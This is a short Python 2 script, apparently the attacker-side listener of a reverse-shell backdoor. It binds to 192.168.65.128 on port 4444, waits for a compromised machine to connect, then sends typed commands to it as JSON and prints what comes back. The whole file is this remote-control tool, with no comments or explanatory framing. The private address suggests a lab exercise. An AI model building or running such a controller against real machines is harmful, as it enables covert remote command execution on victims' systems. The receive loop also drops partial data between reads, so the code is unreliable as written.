#!/usr/bin/env python
import socket, json


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections!")
        self.conn, addr = listener.accept()
        print("[+] Got a new connection from " + str(addr))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.conn.send(json_data.encode("utf-8"))

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = self.conn.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.conn.close()
            exit()
        return self.reliable_receive()

    def run(self):
        while True:
            command = raw_input(">> ")
            command = command.split(" ")
            command_result = self.execute_remotely(command)
            print(command_result)


my_listener = Listener("192.168.65.128", 4444)
my_listener.run()